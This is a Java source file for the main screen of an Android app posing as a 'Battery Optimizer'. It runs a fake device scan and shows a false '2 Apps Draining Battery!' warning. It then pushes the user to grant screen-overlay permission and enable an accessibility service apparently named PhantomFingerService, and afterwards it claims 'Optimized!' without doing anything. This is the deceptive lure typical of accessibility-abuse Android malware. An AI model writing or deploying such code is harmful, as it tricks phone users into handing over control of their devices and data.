package com.smd.batteryoptimizer;

import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Color;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import com.google.android.material.progressindicator.CircularProgressIndicator;

public class MainActivity extends AppCompatActivity {

    private TextView tvBatteryLevel;
    private TextView tvBatteryStatus;
    private TextView tvTemperature;
    private TextView tvStatusMessage;
    private CircularProgressIndicator progressBattery;
    private Button btnOptimize;
    private Button btnSettings;
    private Handler handler = new Handler(Looper.getMainLooper());
    private boolean isScanning = true;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        tvBatteryLevel = findViewById(R.id.tv_battery_level);
        tvBatteryStatus = findViewById(R.id.tv_battery_status);
        tvTemperature = findViewById(R.id.tv_temperature);
        tvStatusMessage = findViewById(R.id.tv_status_message);
        progressBattery = findViewById(R.id.progress_battery);
        btnOptimize = findViewById(R.id.btn_optimize);
        btnSettings = findViewById(R.id.btn_settings);

        btnOptimize.setOnClickListener(v -> {
            if (!Settings.canDrawOverlays(this)) {
                Intent intent = new Intent(
                        Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName())
                );
                startActivity(intent);
            } else if (!isAccessibilityEnabled()) {
                Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                startActivity(intent);
                Toast.makeText(this, "Enable Battery Optimizer to continue", Toast.LENGTH_LONG).show();
            } else {
                tvStatusMessage.setText("Optimized!");
                tvStatusMessage.setTextColor(Color.parseColor("#4CAF50"));
                progressBattery.setIndicatorColor(Color.parseColor("#4CAF50"));
                Toast.makeText(this, "Optimization running in background", Toast.LENGTH_SHORT).show();
            }
        });

        btnSettings.setOnClickListener(v -> {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                ActivityCompat.requestPermissions(
                        this,
                        new String[]{android.Manifest.permission.POST_NOTIFICATIONS},
                        1002
                );
            }
            Toast.makeText(this, "Settings updated", Toast.LENGTH_SHORT).show();
        });

        simulateScanning();
    }

    private void simulateScanning() {
        progressBattery.setIndeterminate(true);
        tvBatteryLevel.setText("--");
        tvStatusMessage.setText("Scanning device...");
        btnOptimize.setEnabled(false);

        handler.postDelayed(() -> {
            isScanning = false;
            progressBattery.setIndeterminate(false);
            btnOptimize.setEnabled(true);

            updateBatteryInfo();
            startBatteryMonitor();
        }, 2500);
    }

    private void updateBatteryInfo() {
        if (isScanning) return;
        IntentFilter filter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryStatus = registerReceiver(null, filter);

        if (batteryStatus != null) {
            int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
            int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
            int temp = batteryStatus.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0);
            int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);

            int batteryPct = (int) ((level / (float) scale) * 100);
            float tempC = temp / 10f;

            progressBattery.setProgressCompat(batteryPct, true);
            tvBatteryLevel.setText(batteryPct + "%");

            String statusText;
            if (status == BatteryManager.BATTERY_STATUS_CHARGING) {
                statusText = "Charging";
            } else if (status == BatteryManager.BATTERY_STATUS_FULL) {
                statusText = "Full";
            } else {
                statusText = "Discharging";
            }
            tvBatteryStatus.setText(statusText);
            tvTemperature.setText(tempC + "°C");

            if (!Settings.canDrawOverlays(this) || !isAccessibilityEnabled()) {
                tvStatusMessage.setText("2 Apps Draining Battery!");
                tvStatusMessage.setTextColor(Color.parseColor("#E64A19"));
                progressBattery.setIndicatorColor(Color.parseColor("#FF9800"));
            } else {
                tvStatusMessage.setText("Optimized");
                tvStatusMessage.setTextColor(Color.parseColor("#4CAF50"));
                progressBattery.setIndicatorColor(Color.parseColor("#4CAF50"));
            }
        }
    }

    private void startBatteryMonitor() {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                updateBatteryInfo();
                handler.postDelayed(this, 5000);
            }
        }, 5000);
    }

    private boolean isAccessibilityEnabled() {
        String enabledServices = Settings.Secure.getString(
                getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        );
        if (enabledServices != null) {
            return enabledServices.contains(getPackageName() + "/" + PhantomFingerService.class.getName());
        }
        return false;
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        handler.removeCallbacksAndMessages(null);
    }
}